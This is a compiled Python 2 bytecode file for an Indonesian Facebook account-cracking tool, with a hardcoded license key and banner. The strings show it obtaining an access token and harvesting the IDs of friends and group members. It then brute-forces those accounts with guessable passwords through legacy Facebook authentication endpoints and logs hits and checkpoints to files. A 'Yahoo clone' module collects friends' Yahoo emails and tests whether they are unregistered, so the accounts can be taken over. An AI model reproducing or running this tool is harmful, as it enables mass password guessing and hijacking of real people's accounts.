ó
Lb^c           @   su  d  d l  Z  d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l	 Z	 d  d l
 Z
 d  d l Z d  d l Z d  d l m Z d  d l m Z d  d l m Z e e  e j d  e j   Z e j e  e j e j j   d d d( g e _ d
   Z d   Z d   Z d   Z d Z d   Z  d Z! g  Z" g  a# g  a$ g  Z% g  Z& d Z' d Z( e  j) d  d Z* d Z+ xL e+ d k rîe, d  Z- e- e* k rÙd e- GHd Z+ q£d GHe  j) d  q£Wd   Z. d   Z/ d   Z0 d   Z1 d   Z2 d    Z3 d!   Z4 d"   Z5 d#   Z6 d$   Z7 d%   Z8 d&   Z9 e: d' k rqe.   n  d S()   iÿÿÿÿN(   t
   ThreadPool(   t   ConnectionError(   t   Browsert   utf8t   max_timei   s
   User-AgentsR   Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16c           C   s   d GHt  j j   d  S(   Ns   [1;96m[!] [1;91mExit(   t   ost   syst   exit(    (    (    s   /sdcard/p.pyt   keluar   s    c         C   sS   d } d } x: t  D]2 } | d | t j d t |  d  | 7} q Wt |  S(   Nt   ahtdzjct    t   !i    i   (   t   xt   randomt   randintt   lent   cetak(   t   bt   wt   dt   i(    (    s   /sdcard/p.pyt   acak   s
    0c         C   s~   d } xA | D]9 } | j  |  } | j d | d t d |   } q W| d 7} | j d d  } t j j | d  d  S(   NR	   s   !%ss   [%s;1mi   s   [0ms   !0s   
(   t   indext   replacet   strR   t   stdoutt   write(   R   R   R   t   jR   (    (    s   /sdcard/p.pyR       s    (
c         C   sC   x< |  d D]0 } t  j j |  t  j j   t j d  q Wd  S(   Ns   
g¹?(   R   R   R   t   flusht   timet   sleep(   t   zt   e(    (    s   /sdcard/p.pyt   jalan*   s    s  [1;93mâââââââââ
[1;93mâââââââââ      [1;91mââ¬â¬â¬â¬â¬â¬â¬â¬â¬à¹Û©Û©à¹â¬â¬â¬â¬â¬â¬â¬â¬â
[1;93mâ[1;92mâ¼â¼â¼â¼â¼ [1;92m- _ --_--[1;95mââ¦âââââ¬âââ¬ââ   âââââ
[1;93mâ [1;92m [1;92m_-_-- -_ --__[1;93m âââââ¤ââ¬âââ´âââââ â£ â â©â
[1;93mâ[1;92mâ²â²â²â²â²[1;92m--  - _ --[1;96mââ©ââ´ â´â´âââ´ â´   â  âââ [1;96  PANGERAN TAMVAN'S
[1;93mâââââââââ      [1;92mÂ«----------â§----------Â»
[1;93m ââ ââ
[1;93mââââââââââââââââââââââââââââââââââââââââââââââ
[1;93mâ[1;96m* [1;93mAuthor  [1;93m : [1;93mPangeran-Tamvan[1;93m                â
[1;93mâ[1;96m* [1;93mGrup    [1;93m : [1;93m[4mhttps://bit.ly/3czy1Sh[0m [1;93m        â
[1;93mâ[1;96m* [1;93mFacebook [1;93m: [1;93mUsep Sumpena[1;93m                   â
[1;93mââââââââââââââââââââââââââââââââââââââââââââââc          C   sF   d d d g }  x0 |  D]( } d | Gt  j j   t j d  q Wd  S(   Ns   .   s   ..  s   ... s)   [1;96m[â] [1;93mSedang masuk [1;97mi   (   R   R   R   R   R   (   t   titikt   o(    (    s   /sdcard/p.pyt   tik?   s
      i    s   [31mNot Vulns	   [32mVulnt   clears   MSHHBK-SX7D3J-5FL5KJt   trues2   [1;96m[â] [1;93mENTER LICENSE KEY [1;96m>>>> s   Logged in successfully as t   falses   [31;1mLICENSE KEY NOT VALIDs%   xdg-open https://wa.me/+6281332961491c          C   sÂ  t  j d  y t d d  }  t   Wnt t f k
 r½t  j d  t GHd d GHd GHt d  } t d  } t   y t	 j d	  Wn  t
 j k
 r¯ d
 GHt   n Xt t	 j _ t	 j d d  | t	 j d <| t	 j d <t	 j   t	 j   } d | k r_y.d | d | d } i d d 6d d 6| d 6d d 6d d 6d d 6d d 6d d 6| d 6d  d! 6d" d# 6} t j d$  } | j |  | j   } | j i | d% 6 d& } t j | d' | } t j | j  }	 t d d(  }
 |
 j |	 d)  |
 j   d* GHt  j d+  t j d, |	 d)  t   Wq_t j  j! k
 r[d
 GHt   q_Xn  d- | k rd. GHt  j d/  t" j# d0  t   q¾d1 GHt  j d/  t" j# d0  t$   n Xd  S(2   NR%   s	   login.txtt   ri*   s   [1;96m=s9   [1;96m[â] [1;93mLOGIN AKUN FACEBOOK ANDA [1;96m[â]s+   [1;96m[+] [1;93mID/Email [1;91m: [1;92ms+   [1;96m[+] [1;93mPassword [1;91m: [1;92ms   https://m.facebook.coms$   
[1;96m[!] [1;91mTidak ada koneksit   nri    t   emailt   passs   save-devicesG   api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail=s`   format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword=s;   return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32t    882a8490361da98702bf97a021ddc14dt   api_keyt   passwordt   credentials_typet   JSONt   formatt   1t   generate_machine_idt   generate_session_cookiest   en_USt   locales
   auth.logint   methodt   0t   return_ssl_resourcess   1.0t   vt   md5t   sigs'   https://api.facebook.com/restserver.phpt   paramsR   t   access_tokens#   
[1;96m[â] [1;92mLogin Berhasils=   xdg-open https://youtube.com/channel/UCkoqlUeR59-foCsaMdQJOJwsM   https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token=t
   checkpoints7   
[1;96m[!] [1;91mSepertinya akun anda kena checkpoints   rm -rf login.txti   s'   
[1;96m[!] [1;91mPassword/Email salah(%   R   t   systemt   opent   menut   KeyErrort   IOErrort   logot	   raw_inputR$   t   brt	   mechanizet   URLErrorR   t   Truet   _factoryt   is_htmlt   select_formt   formt   submitt   geturlt   hashlibt   newt   updatet	   hexdigestt   requestst   gett   jsont   loadst   textR   t   closet   postt
   exceptionsR   R   R   t   login(   t   tokett   idt   pwdt   urlR<   t   dataR   t   aR(   R   t   unikers(    (    s   /sdcard/p.pyR]   ^   sj    	
S

c          C   sp  t  j d  y t d d  j   }  WnD t k
 rl t  j d  d GHt  j d  t j d  t   n Xy= t j	 d |   } t
 j | j  } | d } | d	 } Wnf t k
 rð t  j d  d
 GHt  j d  t j d  t   n# t j j k
 rd GHt   n Xt  j d  t GHd d GHd | d GHd | d GHd d GHd GHd GHd GHd GHt   d  S(   NR%   s	   login.txtR(   s   [1;96m[!] [1;91mToken invalids   rm -rf login.txti   s+   https://graph.facebook.com/me?access_token=t   nameR_   s6   [1;96m[!] [1;91mSepertinya akun anda kena checkpoints#   [1;96m[!] [1;91mTidak ada koneksii*   s   [1;96m=s7   [1;96m[[1;97mâ[1;96m][1;93m Nama [1;91m: [1;92ms   [1;97m               s7   [1;96m[[1;97mâ[1;96m][1;93m ID   [1;91m: [1;92ms   [1;97m              s+   [1;96m[[1;92m1[1;96m][1;93m Hack Fb MBFs@   [1;96m[[1;92m2[1;96m][1;93m Lihat daftar grup               s:   [1;96m[[1;92m4[1;96m][1;93m Yahoo clone               s2   [1;96m[[1;91m0[1;96m][1;91m Keluar            (   R   R@   RA   t   readRD   R   R   R]   RU   RV   RW   RX   RY   RC   R\   R   R   RE   t   pilih(   R^   t   otwRc   t   namaR_   (    (    s   /sdcard/p.pyRB      sD    

		c          C   s¦   t  d  }  |  d k r' d GHt   n{ |  d k r= t   ne |  d k rS t   nO |  d k ri t   n9 |  d k r t d  t j d	  t   n d GHt   d  S(
   Ns   
[1;97m >>> [1;97mR
   s    [1;96m[!] [1;91mIsi yang benarR2   t   2t   3R8   s   Menghapus tokens   rm -rf login.txt(	   RF   Rg   t   supert   grupsayat   yahooR!   R   R@   R   (   Rd   (    (    s   /sdcard/p.pyRg   ¼   s     





c           C   s   t  j d  y t d d  j   a Wn7 t k
 r_ d GHt  j d  t j d  t   n Xt  j d  t	 GHd d GHd	 GHd
 GHd GHd GHd GHt
   d  S(   NR%   s	   login.txtR(   s   [1;96m[!] [1;91mToken invalids   rm -rf login.txti   i*   s   [1;96m=s7   [1;96m[[1;92m1[1;96m][1;93m Crack dari daftar temans0   [1;96m[[1;92m2[1;96m][1;93m Crack dari temans6   [1;96m[[1;92m3[1;96m][1;93m Crack dari member grups/   [1;96m[[1;92m4[1;96m][1;93m Crack dari files'   [1;96m[[1;91m0[1;96m][1;91m Kembali(   R   R@   RA   Rf   R^   RD   R   R   R]   RE   t   pilih_super(    (    (    s   /sdcard/p.pyRl   Ð   s"    	c          C   s;  t  d  }  |  d k r' d GHt   n.|  d k r¦ t j d  t GHd d GHt d  t j d	 t  } t	 j
 | j  } xÕ| d
 D] } t j | d  q Wn¯|  d k r¡t j d  t GHd d GHt  d  } y> t j d | d t  } t	 j
 | j  } d | d GHWn' t k
 r@d GHt  d  t   n Xt d  t j d | d t  } t	 j
 | j  } xÚ| d
 D] } t j | d  qWn´|  d k rt j d  t GHd d GHt  d  } y> t j d | d t  } t	 j
 | j  }	 d |	 d GHWn' t k
 r;d GHt  d  t   n Xt d  t j d | d t  }
 t	 j
 |
 j  } xß | d
 D] } t j | d  q~Wn¹ |  d k r3t j d  t GHd d GHyC t  d  } x0 t | d  j   D] } t j | j    qèWWqUt k
 r/d GHt  d   t   qUXn" |  d! k rIt   n d GHt   d" t t t   GHt d#  d$ d% d& g } x0 | D]( } d' | Gt j j   t j d(  qWHd) GHd d GHd*   } t d+  } | j | t  d d GHd, GHd- t t t   d. t t t   GHd/ GHt  d  t   d  S(0   Ns   
[1;97m >>> [1;97mR
   s    [1;96m[!] [1;91mIsi yang benarR2   R%   i*   s   [1;96m=s+   [1;96m[âº] [1;93mMengambil ID [1;97m...s3   https://graph.facebook.com/me/friends?access_token=Rb   R_   Rj   s3   [1;96m[+] [1;93mMasukan ID teman [1;91m: [1;97ms   https://graph.facebook.com/s   ?access_token=s=   [1;96m[[1;97mâ[1;96m] [1;93mNama teman[1;91m :[1;97m Re   s(   [1;96m[!] [1;91mTeman tidak ditemukan!s   
[1;96m[[1;97mKembali[1;96m]s   /friends?access_token=Rk   s3   [1;96m[+] [1;93mMasukan ID group [1;91m:[1;97m s%   https://graph.facebook.com/group/?id=s   &access_token=s=   [1;96m[[1;97mâ[1;96m] [1;93mNama group [1;91m:[1;97m s'   [1;96m[!] [1;91mGroup tidak ditemukans5   /members?fields=name,id&limit=999999999&access_token=t   4s5   [1;96m[+] [1;93mMasukan nama file  [1;91m: [1;97mR(   s&   [1;96m[!] [1;91mFile tidak ditemukans!   
[1;96m[ [1;97mKembali [1;96m]R8   s+   [1;96m[+] [1;93mTotal ID [1;91m: [1;97ms$   [1;96m[âº] [1;93mStart [1;97m...s   .   s   ..  s   ... s0   [1;96m[[1;97mâ¸[1;96m] [1;93mCrack [1;97mi   s   [1;96m[!] [1;93mStop CTRL+zc         S   s;  |  } y t  j d  Wn t k
 r* n Xyt j d | d t  } t j | j  } d } t	 j
 d | d | d  } t j |  } d | k rÀ d	 | d
 | GHt j | |  nld | d k r'd | d
 | GHt d d  } | j | d | d  | j   t j | |  n| d d } t	 j
 d | d | d  } t j |  } d | k rd	 | d
 | GHt j | |  nd | d k rûd | d
 | GHt d d  } | j | d | d  | j   t j | |  n1| d d }	 t	 j
 d | d |	 d  } t j |  } d | k rhd	 | d
 |	 GHt j | |	  nÄd | d k rÏd | d
 |	 GHt d d  } | j | d |	 d  | j   t j | |	  n]d }
 t	 j
 d | d |
 d  } t j |  } d | k r4d	 | d
 |
 GHt j | |
  nød | d k rd | d
 |
 GHt d d  } | j | d |
 d  | j   t j | |
  nd } t	 j
 d | d | d  } t j |  } d | k r d	 | d
 | GHt j | |  n,d | d k rgd | d
 | GHt d d  } | j | d | d  | j   t j | |  nÅd } t	 j
 d | d | d  } t j |  } d | k rÌd	 | d
 | GHt j | |  n`d | d k r3d | d
 | GHt d d  } | j | d | d  | j   t j | |  nù t j d | d t  } t j | j  } d } t	 j
 d | d | d  } t j |  } d | k rÅd	 | d
 | GHt j | |  ng d | d k r,d | d
 | GHt d d  } | j | d | d  | j   t j | |  n  Wn n Xd  S(   Nt   outs   https://graph.facebook.com/s   /?access_token=t   786786s   https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=s   &locale=en_US&password=sH   &sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6R>   s'   [1;96m[[1;92mBerhasil[1;96m][1;97m s    [1;96m|[1;97m s   www.facebook.comt	   error_msgs'   [1;96m[[1;93mCekpoint[1;96m][1;97m s   out/super_cp.txtRc   t   |s   
t
   first_namet   12345t	   last_namet   123t   Bangsatt   Sayangt   Kontolt   Anjing(   R   t   mkdirt   OSErrorRU   RV   R^   RW   RX   RY   t   urllibt   urlopent   loadt   okst   appendRA   R   RZ   t   cekpoint(   t   argt   userRc   R   t   pass1Rb   t   qt   cekt   pass2t   pass3t   pass4t   pass5t   pass6t   pass7(    (    s   /sdcard/p.pyt   main2  sÀ    






i   s5   [1;96m[[1;97mâ[1;96m] [1;92mSelesai [1;97m....s5   [1;96m[+] [1;92mTotal OK/[1;93mCP [1;91m: [1;92ms   [1;97m/[1;93msD   [1;96m[+] [1;92mCP File tersimpan [1;91m: [1;97mout/super_cp.txt(    RF   Ro   R   R@   RE   R!   RU   RV   R^   RW   RX   RY   R_   R   RC   Rl   RA   t	   readlinest   stripRD   RB   R   R   R   R   R   R   R   R    t   mapR   R   (   t   peakR(   R   t   st   idtt   jokt   opR   t   idgt   aswt   ret   pt   idlistt   lineR"   R#   R   (    (    s   /sdcard/p.pyRo   ä   s¨    
	
	

	

	


  		r	)
c          C   s#  t  j d  y t d d  j   }  Wn7 t k
 r_ d GHt  j d  t j d  t   n Xy t  j d  Wn t	 k
 r n Xt  j d  t
 GHd d	 GHyÔ t j d
 |   } t j | j  } xp | d D]d } | d } | d } t d d  } t j |  | j | d  d t |  d t |  GHqÓ Wd d	 GHd t t  GHd GH| j   t d  t   Wn¨ t t f k
 r£d GHt d  t   n| t k
 rÖt  j d  d GHt d  t   nI t j j k
 rød GHt   n' t k
 rd GHt d  t   n Xd  S(   NR%   s	   login.txtR(   s'   [1;96m[!] [1;91mToken tidak ditemukans   rm -rf login.txti   Rq   i*   s   [1;96m=s2   https://graph.facebook.com/me/groups?access_token=Rb   Re   R_   s   out/Grupid.txtR   s   
s$   [1;96m[[1;92mGroup[1;96m][1;97m s    [1;96m=>[1;97m s0   [1;96m[+] [1;92mTotal Group [1;91m:[1;97m %ss:   [1;96m[+] [1;92mTersimpan [1;91m: [1;97mout/Grupid.txts   
[1;96m[[1;97mKembali[1;96m]s   [1;96m[!] [1;91mTerhentis'   [1;96m[!] [1;91mGroup tidak ditemukans%   [1;96m[â] [1;91mTidak ada koneksis   [1;96m[!] [1;91mError(   R   R@   RA   Rf   RD   R   R   R]   R}   R~   RE   RU   RV   RW   RX   RY   t   listgrupR   R   R   R   RZ   RF   RB   t   KeyboardInterruptt   EOFErrorRC   t   removeR\   R   R   (   R^   t   uht   gudR   Ri   R_   t   f(    (    s   /sdcard/p.pyRm   ®  s^    	

!	







c           C   s   t  j d  y t d d  j   a Wn7 t k
 r_ d GHt  j d  t j d  t   n Xt  j d  t	 GHd d GHd	 GHd
 GHd GHd GHd GHt
   d  S(   NR%   s	   login.txtR(   s   [1;91m[!] Token not founds   rm -rf login.txti   i*   s   [1;96m=s7   [1;96m[[1;92m1[1;96m][1;93m Clone dari daftar temans0   [1;96m[[1;92m2[1;96m][1;93m Clone dari temans7   [1;96m[[1;92m3[1;96m][1;93m Clone dari member groups/   [1;96m[[1;92m4[1;96m][1;93m Clone dari files'   [1;96m[[1;91m0[1;96m][1;91m Kembali(   R   R@   RA   Rf   R^   RD   R   R   R]   RE   t   clone(    (    (    s   /sdcard/p.pyRn   à  s"    	c          C   s   t  d  }  |  d k r  d GHns |  d k r6 t   n] |  d k rL t   nG |  d k rb t   n1 |  d k rx t   n |  d k r t   n d GHd  S(	   Ns   
[1;97m >>> R
   s    [1;96m[!] [1;91mIsi yang benarR2   Rj   Rk   Rp   R8   (   RF   t   clone_dari_daftar_temant   clone_dari_temant   clone_dari_member_groupt   clone_dari_fileRB   (   t   embuh(    (    s   /sdcard/p.pyR¦   ô  s    




c          C   s×  t  j d  y t d d  j   a Wn7 t k
 r_ d GHt  j d  t j d  t   n Xy t  j	 d  Wn t
 k
 r n Xt  j d  t GHg  }  d	 } d
 d GHt d  t j d t  } t j | j  } t d d  } t d  d GHd
 d GHx| d D]} | d 7} |  j |  | d } | d } t j d | d t  } t j | j  }	 y|	 d }
 t j d  } | j |
  j   } d | k rwt j d  t t j _ t j d d	  |
 t d <t j   j   } t j d  } y | j |  j   } Wn
 wn Xd | k rw| j d | d  | d! |
 d"  d# |
 d$ | GHt j |
  qwn  Wqt k
 rqXqWd
 d GHd% GHd& t  t! t   GHd' GH| j"   t# d(  t$   d  S()   Nt   resets	   login.txtR(   s   [1;91m[!] Token Invalids   rm -rf login.txti   Rq   R%   i    i*   s   [1;96m=s<   [1;96m[[1;97mâº[1;96m] [1;93mMengambil email [1;97m...s3   https://graph.facebook.com/me/friends?access_token=s   out/MailVuln.txtR   s2   [1;96m[[1;97mâº[1;96m] [1;93mStart [1;97m...s   [1;96m[!] [1;93mStop CTRL+zRb   R_   Re   s   https://graph.facebook.com/s   ?access_token=R*   s   @.*s	   yahoo.coms_   https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.comR)   t   usernames$   "messages.ERROR_INVALID_USERNAME">.*s"   "messages.ERROR_INVALID_USERNAME">s   Nama: s   ID :s   Email: s   
s&   [1;96m[[1;92mVULNâ[1;96m] [1;92ms    [1;96m=>[1;97ms5   [1;96m[[1;97mâ[1;96m] [1;92mSelesai [1;97m....s(   [1;96m[+] [1;92mTotal [1;91m: [1;97msA   [1;96m[+] [1;92mFile tersimpan [1;91m:[1;97m out/MailVuln.txts   
[1;96m[[1;97mKembali[1;96m](%   R   R@   RA   Rf   R^   RD   R   R   R]   R}   R~   RE   R!   RU   RV   RW   RX   RY   R   R   t   compilet   searcht   groupRG   RJ   RK   RL   RM   RO   R   t   berhasilRC   R   R   RZ   RF   RB   (   t   mpsht   jmlt   temant   kimakt   saveR   R_   Ri   t   linksR   t   mailRn   Rh   t   klikR   t   pek(    (    s   /sdcard/p.pyR§     sv    	

	




%	

c          C   sS  t  j d  y t d d  j   a Wn7 t k
 r_ d GHt  j d  t j d  t   n Xy t  j	 d  Wn t
 k
 r n Xt  j d  t GHg  }  d } d	 d
 GHt d  } y> t j d | d t  } t j | j  } d | d GHWn' t k
 rd GHt d  t   n Xt d  t j d | d t  } t j | j  } t d d  } t d  d GHd d
 GHx| d D]} | d 7} |  j |  | d }	 | d }
 t j d |	 d t  } t j | j  } y| d } t j d  } | j |  j   } d | k rót j d  t t j _ t j d d  | t d  <t j   j   } t j d!  } y | j |  j   } Wn
 wn Xd" | k ró| j  d# |
 d$ |	 d% | d&  d' | d( |
 GHt! j |  qón  Wqt k
 rqXqWd	 d
 GHd) GHd* t" t# t!   GHd+ GH| j$   t d  t   d  S(,   NR%   s	   login.txtR(   s   [1;96m[!] [1;91mToken invalids   rm -rf login.txti   Rq   i    i*   s   [1;96m=s3   [1;96m[+] [1;93mMasukan ID teman [1;91m: [1;97ms   https://graph.facebook.com/s   ?access_token=s7   [1;96m[[1;97mâ[1;96m] [1;93mNama[1;91m :[1;97m Re   s'   [1;96m[!] [1;91mTeman tidak ditemukans   
[1;96m[[1;97mKembali[1;96m]s.   [1;96m[âº] [1;93mMengambil email [1;97m...s   /friends?access_token=s   out/TemanMailVuln.txtR   s$   [1;96m[âº] [1;93mStart [1;97m...s   [1;96m[!] [1;93mStop CTRL+zi+   Rb   R_   R*   s   @.*s	   yahoo.coms_   https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.comR)   R­   s$   "messages.ERROR_INVALID_USERNAME">.*s"   "messages.ERROR_INVALID_USERNAME">s   Nama: s   ID :s   Email: s   
s&   [1;96m[[1;92mVULNâ[1;96m] [1;92ms    [1;96m=>[1;97ms5   [1;96m[[1;97mâ[1;96m] [1;92mSelesai [1;97m....s(   [1;96m[+] [1;92mTotal [1;91m: [1;97msF   [1;96m[+] [1;92mFile tersimpan [1;91m:[1;97m out/TemanMailVuln.txt(%   R   R@   RA   Rf   R^   RD   R   R   R]   R}   R~   RE   RF   RU   RV   RW   RX   RY   RC   RB   R!   R   R   R®   R¯   R°   RG   RJ   RK   RL   RM   RO   R   R±   R   R   RZ   (   R²   R³   R   R   R   R´   Rµ   R¶   R   R_   Ri   R·   R   R¸   Rn   Rh   R¹   Rº   (    (    s   /sdcard/p.pyR¨   E  s    	


	




%	

c          C   sS  t  j d  y t d d  j   a Wn7 t k
 r_ d GHt  j d  t j d  t   n Xy t  j	 d  Wn t
 k
 r n Xt  j d  t GHg  }  d } d	 d
 GHt d  } y> t j d | d t  } t j | j  } d | d GHWn' t k
 rd GHt d  t   n Xt d  t j d | d t  } t j | j  } t d d  } t d  d GHd	 d
 GHx| d D]} | d 7} |  j |  | d } | d }	 t j d | d t  }
 t j |
 j  } y| d } t j d  } | j |  j   } d | k rót j d  t t j _ t j d  d  | t d! <t j   j   } t j d"  } y | j |  j   } Wn
 wn Xd# | k ró| j  d$ |	 d% | d& | d'  d( | d) |	 GHt! j |  qón  Wqt k
 rqXqWd	 d
 GHd* GHd+ t" t# t!   GHd, GH| j$   t d  t   d  S(-   NR%   s	   login.txtR(   s   [1;96m[!] [1;91mToken invalids   rm -rf login.txti   Rq   i    i*   s   [1;96m=s3   [1;96m[+] [1;93mMasukan ID group [1;91m:[1;97m s%   https://graph.facebook.com/group/?id=s   &access_token=s=   [1;96m[[1;97mâ[1;96m] [1;93mNama group [1;91m:[1;97m Re   s'   [1;96m[!] [1;91mGroup tidak ditemukans   
[1;96m[[1;97mKembali[1;96m]s.   [1;96m[âº] [1;93mMengambil email [1;97m...s   https://graph.facebook.com/s5   /members?fields=name,id&limit=999999999&access_token=s   out/GrupMailVuln.txtR   s$   [1;96m[âº] [1;93mStart [1;97m...s   [1;96m[!] [1;93mStop CTRL+zRb   R_   s   ?access_token=R*   s   @.*s	   yahoo.coms_   https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.comR)   R­   s$   "messages.ERROR_INVALID_USERNAME">.*s"   "messages.ERROR_INVALID_USERNAME">s   Nama: s   ID :s   Email: s   
s&   [1;96m[[1;97mVULNâ[1;96m] [1;92ms    [1;96m=>[1;97ms5   [1;96m[[1;97mâ[1;96m] [1;92mSelesai [1;97m....s(   [1;96m[+] [1;92mTotal [1;91m: [1;97msE   [1;96m[+] [1;92mFile tersimpan [1;91m:[1;97m out/GrupMailVuln.txt(%   R   R@   RA   Rf   R^   RD   R   R   R]   R}   R~   RE   RF   RU   RV   RW   RX   RY   RC   RB   R!   R   R   R®   R¯   R°   RG   RJ   RK   RL   RM   RO   R   R±   R   R   RZ   (   R²   R³   R_   R(   R   R´   Rµ   R¶   R   Ri   R·   R   R¸   Rn   Rh   R¹   R   Rº   (    (    s   /sdcard/p.pyR©     s    	


	




%	

c          C   s¡  t  j d  y t d d  j   a Wn7 t k
 r_ d GHt  j d  t j d  t   n Xy t  j	 d  Wn t
 k
 r n Xt  j d  t GHd d	 GHt d
  }  y t |  d  } | j   } Wn' t k
 rô d GHt d  t   n Xg  } d } t d  d GHt d d  } d d	 GHt |  d  j   } x| D]} | j d d  } | d 7} | j |  t j d  } | j |  j   } d | k rDt j d  t t j _ t j d d  | t d <t j   j   }	 t j d  }
 y |
 j |	  j   } Wn
 qDn Xd | k rV| j | d  d | GHt j |  qVqDqDWd d	 GHd GHd t t t   GHd GH| j    t d  t   d  S(   NR%   s	   login.txtR(   s   [1;96m[!] [1;91mToken invalids   rm -rf login.txti   Rq   i*   s   [1;96m=s,   [1;96m[+] [1;93mNama File [1;91m: [1;97ms&   [1;96m[!] [1;91mFile tidak ditemukans   
[1;96m[[1;97mKembali[1;96m]i    s$   [1;96m[âº] [1;93mStart [1;97m...s   [1;96m[!] [1;93mStop CTRL+zs   out/FileMailVuln.txtR   s   
R
   s   @.*s	   yahoo.coms_   https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.comR)   R­   s$   "messages.ERROR_INVALID_USERNAME">.*s"   "messages.ERROR_INVALID_USERNAME">s&   [1;96m[[1;92mVULNâ[1;96m] [1;92ms5   [1;96m[[1;97mâ[1;96m] [1;92mSelesai [1;97m....s(   [1;96m[+] [1;92mTotal [1;91m: [1;97msE   [1;96m[+] [1;92mFile Tersimpan [1;91m:[1;97m out/FileMailVuln.txt(!   R   R@   RA   Rf   R^   RD   R   R   R]   R}   R~   RE   RF   R   RB   R!   R   R   R   R®   R¯   R°   RG   RJ   RK   RL   RM   RO   R   R±   R   R   RZ   (   t   filest   totalR¸   R²   R³   R¶   t   pwRn   Rh   R¹   R   Rº   (    (    s   /sdcard/p.pyRª   Ô  st    	

	

		

t   __main__(   s
   User-AgentsR   Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16(;   R   R   R   t   datetimeR   RQ   R   t	   threadingRW   R   t	   cookielibRU   RH   t   multiprocessing.poolR    t   requests.exceptionsR   R   t   reloadt   setdefaultencodingRG   t   set_handle_robotst   Falset   set_handle_refresht   _httpt   HTTPRefreshProcessort
   addheadersR   R   R   R!   RE   R$   t   backR±   R   R   R_   R   t   vulnott   vulnR@   t   CorrectLicenset   loopRF   t   licenseR]   RB   Rg   Rl   Ro   Rm   Rn   R¦   R§   R¨   R©   Rª   t   __name__(    (    (    s   /sdcard/p.pyt   <module>   s^   
			
					9	%			Ê	2			?	G	H	?